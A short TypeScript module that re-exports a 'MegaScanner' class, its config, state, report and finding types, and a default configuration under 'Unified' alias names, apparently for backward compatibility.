export { MegaScanner as UnifiedScanner };
export type { MegaScanConfig   as UnifiedScanConfig };
export type { MegaScanState    as UnifiedScanState };
export type { MegaReport       as UnifiedReport };
export type { MegaFinding      as UnifiedFinding };
export type { PhaseResult };
export const DEFAULT_UNIFIED_CONFIG = DEFAULT_MEGA_CONFIG;
